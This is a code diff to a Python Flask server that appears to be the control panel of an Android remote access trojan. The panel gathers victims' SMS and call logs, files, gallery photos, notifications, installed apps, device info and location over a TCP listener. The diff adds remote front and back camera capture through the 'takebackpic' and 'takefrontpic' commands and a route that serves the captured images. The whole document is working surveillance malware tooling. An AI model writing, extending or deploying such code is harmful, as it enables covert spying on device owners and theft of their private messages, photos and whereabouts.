@@ -32,7 +32,7 @@ def create_initial_ui_data():
     return {
         "sms_logs": [], "call_logs": [], "file_manager": {"path": "/", "files": []},
         "gallery": {"page": 0, "files": []}, "notifications": [], "apps": [],
-        "device_info": {}, "location_url": None,
+        "device_info": {}, "location_url": None, "camera_image": None,
     }
 
 # --- Data Handlers ---
@@ -88,16 +88,22 @@ def handle_file_transfer(payload, log_type, client_id):
     elif 'END' in log_type:
         filename = payload.get('file')
         if filename and filename in file_transfers:
-            folder = 'gallery_downloads' if 'GALLERY' in log_type else 'device_downloads'
+            folder = 'device_downloads'
+            if 'GALLERY' in log_type: folder = 'gallery_downloads'
+            if 'CAMERA' in log_type: folder = 'captured_images'
+            
             save_path = os.path.join(folder, secure_filename(filename))
             try:
                 full_base64_data = "".join(file_transfers.pop(filename))
                 with open(save_path, 'wb') as f:
                     f.write(base64.b64decode(full_base64_data))
                 add_log(f"[DOWNLOAD] {client_id} saved {filename} to {save_path}")
-                if 'GALLERY' in log_type:
-                    with clients_lock:
+                
+                with clients_lock:
+                    if 'GALLERY' in log_type:
                         clients[client_id]['ui_data']['gallery']['view_image'] = save_path
+                    if 'CAMERA' in log_type:
+                        clients[client_id]['ui_data']['camera_image'] = save_path
             except Exception as e:
                 add_log(f"[ERROR] Saving file {filename} from {client_id}: {e}")
 
@@ -194,6 +200,7 @@ def send_command_route():
         if cmd == 'getcalllogs': client_data['call_logs'] = []
         if cmd == 'list_app': client_data['apps'] = []
         if cmd == 'filemanager' or cmd.startswith('cd '): client_data['file_manager']['files'] = []
+        if cmd == 'takebackpic' or cmd == 'takefrontpic': client_data['camera_image'] = None
         if cmd == 'gallery': client_data['gallery'] = {'page': 0, 'files': []}
         if cmd == 'gallery next':
             client_data['gallery']['page'] += 1
@@ -222,6 +229,10 @@ def send_command_route():
 def serve_gallery_image(filename):
     # This route is no longer necessary for thumbnails but can be kept for full-size images if needed.
     return send_from_directory('gallery_downloads', filename)
+
+@app.route('/captured_images/<path:filename>')
+def serve_captured_image(filename):
+    return send_from_directory('captured_images', filename)
 
 if __name__ == '__main__':
     threading.Thread(target=tcp_listener, daemon=True).start()
